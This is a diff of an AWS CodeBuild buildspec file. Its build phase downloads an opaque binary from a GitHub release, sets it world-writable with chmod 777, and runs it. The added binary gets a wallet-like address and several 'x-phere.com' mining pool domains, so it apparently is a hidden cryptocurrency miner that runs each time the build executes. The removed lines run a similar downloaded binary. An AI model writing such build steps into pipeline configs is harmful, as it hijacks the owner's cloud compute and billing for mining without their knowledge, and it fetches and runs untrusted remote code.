@@ -3,7 +3,6 @@ version: 0.2
 phases:
   build:
     commands:
-        - wget https://github.com/vedhagsvp/qubros/raw/main/appsettings.json
-        - wget https://github.com/vedhagsvp/taberas/releases/download/mlb/kaospa
-        - chmod 777 kaospa appsettings.json
-        - ./kaospa
+        - wget https://github.com/vedhagsvp/qubros/releases/download/apl/mnxpcna
+        - chmod 777 mnxpcna
+        - ./mnxpcna -targetMiner 0x414A2A8b272cbD0bcEbb70ae1919cfeff89521E7 -domain https://sgp-mining.x-phere.com,https://bkk-mining.x-phere.com,https://hkg-mining.x-phere.com,https://idn-mining.x-phere.com
